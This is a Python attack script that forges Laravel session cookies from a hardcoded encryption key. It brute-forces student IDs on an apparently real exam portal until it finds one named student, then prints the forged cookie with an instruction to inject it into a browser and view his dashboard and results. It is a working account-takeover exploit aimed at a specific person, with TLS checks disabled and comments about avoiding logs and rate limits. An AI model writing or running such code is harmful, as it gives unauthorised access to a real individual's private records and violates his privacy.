import base64, json, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

KEY = base64.b64decode("kbqL/05YWl0TZEnb3oE4811UauhKhWps9c4IWsQiFHQ=")

def forge_cookie(uid):
    payload = {
        "id": uid,
        "login_web_59ba36addc2b2f9401580f014c7f58ea4e30989d": uid
    }
    iv = AES.get_random_bytes(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    enc = cipher.encrypt(pad(json.dumps(payload).encode(), AES.block_size))
    final = base64.b64encode(
        json.dumps({"iv": base64.b64encode(iv).decode(), "value": base64.b64encode(enc).decode()}).encode()
    ).decode()
    return final

print("[*] Scanning IDs 2000 to 5000 for AFNAN TARIQ...")
print("[*] (Only 302/200 responses, no SQL logs, no USN in URLs)\n")

for uid in range(2000, 5001):
    cookie = forge_cookie(uid)
    try:
        resp = requests.get(
            "https://student.citexams.in/dashboard",
            cookies={"laravel_session": cookie},
            verify=False,
            timeout=3,
            allow_redirects=False
        )
        # If status 200 and contains the name, we found him!
        if resp.status_code == 200 and "AFNAN TARIQ" in resp.text:
            print(f"\n✅✅✅ FOUND AFNAN TARIQ at Student ID: {uid} ✅✅✅")
            print(f"Session Cookie: {cookie}")
            print("Inject this into your browser to view his dashboard & results.")
            break
        
        # If 302 redirect, the ID is invalid (or not logged in, but we can still brute)
        if uid % 100 == 0:
            print(f"   ...checked up to {uid} (last status: {resp.status_code})")
            
    except Exception as e:
        pass  # Ignore connection hiccups

    time.sleep(0.05)  # Be polite, avoid rate limits

print("\n[*] Scan complete.")